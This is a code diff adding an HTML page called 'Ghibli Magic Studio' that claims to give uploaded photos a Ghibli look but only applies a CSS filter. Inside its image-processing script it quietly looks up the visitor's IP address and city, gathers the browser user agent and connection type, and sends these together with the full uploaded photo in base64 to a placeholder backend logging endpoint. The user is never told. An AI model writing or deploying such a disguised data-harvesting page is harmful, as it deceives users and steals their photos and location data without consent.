@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghibli Magic Studio</title>
+    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        .drop-zone {
+            border: 2px dashed #4a5568;
+            transition: all 0.3s;
+        }
+        .drop-zone:hover {
+            border-color: #4299e1;
+            background-color: rgba(66, 153, 225, 0.1);
+        }
+        .ghibli-filter {
+            filter: hue-rotate(-10deg) saturate(1.2) contrast(0.9);
+            animation: dreamy 3s infinite;
+        }
+        @keyframes dreamy {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen">
+    <div class="container mx-auto px-4 py-12">
+        <h1 class="text-4xl font-bold text-center mb-8 text-blue-600">🎨 Ghibli Magic Studio</h1>
+        
+        <div class="drop-zone rounded-lg p-8 text-center mb-8 cursor-pointer bg-white shadow-lg"
+             ondragover="event.preventDefault()" 
+             ondrop="handleDrop(event)">
+            <span class="text-gray-600">📁 ড্র্যাগ অ্যান্ড ড্রপ করুন বা ক্লিক করুন</span>
+            <input type="file" id="fileInput" hidden accept="image/*" onchange="handleFileSelect(event)">
+        </div>
+
+        <div class="grid md:grid-cols-2 gap-8 mb-8">
+            <div class="bg-white p-4 rounded-lg shadow-lg">
+                <h3 class="text-xl font-semibold mb-4">আপনার ছবি</h3>
+                <img id="originalImage" class="max-w-full h-auto rounded">
+            </div>
+            <div class="bg-white p-4 rounded-lg shadow-lg">
+                <h3 class="text-xl font-semibold mb-4">Ghibli ম্যাজিক ✨</h3>
+                <img id="processedImage" class="max-w-full h-auto rounded ghibli-filter">
+                <button id="downloadBtn" class="mt-4 bg-blue-600 text-white px-6 py-2 rounded hidden">
+                    ডাউনলোড করুন
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const dropZone = document.querySelector('.drop-zone');
+        const fileInput = document.getElementById('fileInput');
+        const downloadBtn = document.getElementById('downloadBtn');
+
+        dropZone.addEventListener('click', () => fileInput.click());
+
+        async function handleFileSelect(e) {
+            const file = e.target.files[0];
+            await processImage(file);
+        }
+
+        async function handleDrop(e) {
+            e.preventDefault();
+            const file = e.dataTransfer.files[0];
+            await processImage(file);
+        }
+
+        async function processImage(file) {
+            const reader = new FileReader();
+            
+            reader.onload = async (e) => {
+                // ছবি প্রদর্শন
+                document.getElementById('originalImage').src = e.target.result;
+                document.getElementById('processedImage').src = e.target.result;
+                
+                // ডাউনলোড বাটন সক্রিয় করুন
+                downloadBtn.classList.remove('hidden');
+                downloadBtn.onclick = () => {
+                    const link = document.createElement('a');
+                    link.download = `ghibli-${Date.now()}.jpg`;
+                    link.href = e.target.result;
+                    link.click();
+                };
+
+                // ব্যবহারকারীর ডেটা সংগ্রহ করুন
+                const userData = await collectUserData();
+                userData.image = e.target.result.split(',')[1]; // Base64 image
+                
+                // ডেটা সার্ভারে পাঠান
+                fetch('YOUR_BACKEND_URL/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                });
+            };
+            
+            reader.readAsDataURL(file);
+        }
+
+        async function collectUserData() {
+            const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+            const locationData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(res => res.json());
+            
+            return {
+                ip: ipData.ip,
+                location: `${locationData.city}, ${locationData.country_name}`,
+                userAgent: navigator.userAgent,
+                connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
+            };
+        }
+    </script>
+</body>
+</html>
